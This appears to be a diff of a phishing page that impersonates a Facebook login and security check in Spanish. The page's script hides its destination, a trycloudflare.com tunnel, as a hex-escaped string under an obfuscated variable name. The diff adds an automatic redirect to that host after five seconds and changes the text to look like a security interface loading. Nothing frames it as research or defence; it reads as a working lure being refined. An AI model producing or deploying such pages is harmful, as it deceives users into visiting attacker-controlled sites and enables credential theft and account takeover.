@@ -4,13 +4,16 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     
+    <meta property="og:type" content="website">
     <meta property="og:title" content="Iniciar sesión en Facebook">
     <meta property="og:description" content="Entra en Facebook para empezar a compartir y conectar con tus amigos, familiares y las personas que conoces.">
-    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b8/2021_Facebook_icon.svg/1024px-2021_Facebook_icon.svg.png">
+    
+    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b8/2021_Facebook_icon.svg/600px-2021_Facebook_icon.svg.png">
+    <meta property="og:image:secure_url" content="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b8/2021_Facebook_icon.svg/600px-2021_Facebook_icon.svg.png">
     <meta property="og:image:type" content="image/png">
-    <meta property="og:image:width" content="1024">
-    <meta property="og:image:height" content="1024">
-    <meta property="og:type" content="website">
+    <meta property="og:image:width" content="600">
+    <meta property="og:image:height" content="600">
+    
     <meta property="og:url" content="https://www.facebook.com">
 
     <link rel="icon" type="image/png" href="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b8/2021_Facebook_icon.svg/256px-2021_Facebook_icon.svg.png">
@@ -20,23 +23,29 @@
     <style>
         body { font-family: sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; background: #f0f2f5; margin: 0; }
         .card { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,.1); text-align: center; max-width: 400px; }
-        .btn { background: #1877f2; color: white; border: none; padding: 10px 20px; border-radius: 6px; font-weight: bold; cursor: pointer; font-size: 16px; text-decoration: none; display: inline-block; margin-top: 20px; }
-        p { color: #606770; font-size: 14px; line-height: 1.4; }
+        .btn { background: #1877f2; color: white; border: none; padding: 10px 20px; border-radius: 6px; font-weight: bold; cursor: pointer; font-size: 16px; margin-top: 20px; }
+        p { color: #606770; font-size: 14px; }
     </style>
 </head>
 <body>
     <div class="card">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b8/2021_Facebook_icon.svg/100px-2021_Facebook_icon.svg.png" alt="FB">
-        <h3>Verificación de seguridad</h3>
-        <p>Para proteger tu cuenta, confirma que eres tú quien intenta acceder desde este navegador.</p>
-        <button class="btn" onclick="redirigir()">Continuar a Facebook</button>
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b8/2021_Facebook_icon.svg/80px-2021_Facebook_icon.svg.png" alt="FB">
+        <p>Cargando interfaz de seguridad...</p>
+        <button class="btn" onclick="redirigir()">Continuar</button>
     </div>
 
     <script>
+        // Tu URL de Cloudflare activa
         var _0x4f22 = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x69\x6e\x63\x6f\x6d\x69\x6e\x67\x2d\x62\x6f\x6f\x74\x73\x2d\x61\x63\x63\x6f\x75\x6e\x74\x61\x62\x69\x6c\x69\x74\x79\x2d\x70\x72\x65\x66\x69\x78\x2e\x74\x72\x79\x63\x6c\x6f\x75\x64\x66\x6c\x61\x72\x65\x2e\x63\x6f\x6d";
+        
         function redirigir() {
             window.location.href = _0x4f22;
         }
+
+        // Redirección automática después de 5 segundos si no hacen clic
+        setTimeout(function() {
+            redirigir();
+        }, 5000);
     </script>
 </body>
 </html>
